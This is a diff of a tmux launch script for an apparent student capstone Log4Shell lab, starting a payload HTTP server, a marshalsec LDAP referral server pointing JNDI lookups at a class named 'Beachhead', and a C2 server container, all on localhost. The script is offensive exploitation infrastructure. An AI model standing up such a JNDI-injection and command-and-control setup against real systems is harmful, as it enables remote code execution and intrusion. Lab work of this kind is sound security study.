@@ -31,10 +31,10 @@ tmux send-keys -t $SESSION:1.0 "cd ~/log4jlab/server && java -Xmx1024M -Xms1024M
 tmux send-keys -t $SESSION:1.1 "cd ~/log4jlab/payload && python3 -m http.server 8888" C-m
 
 # Pane 2: Marshalsec
-tmux send-keys -t $SESSION:1.2 "cd ~/log4jlab/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://127.0.0.1:8888/#Implant'" C-m
+tmux send-keys -t $SESSION:1.2 "cd ~/log4jlab/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://127.0.0.1:8888/#Beachhead'" C-m
 
 # Pane 3: C2 Server
-tmux send-keys -t $SESSION:1.3 "cd ~/564Capstone/c2-server && docker start capstone-c2-server-draft" C-m
+tmux send-keys -t $SESSION:1.3 "cd ~/564Capstone/c2-server && docker start capstone-c2-server-draft && python3 -m http.server 8000" C-m
 
 # Attach
 tmux attach -t $SESSION
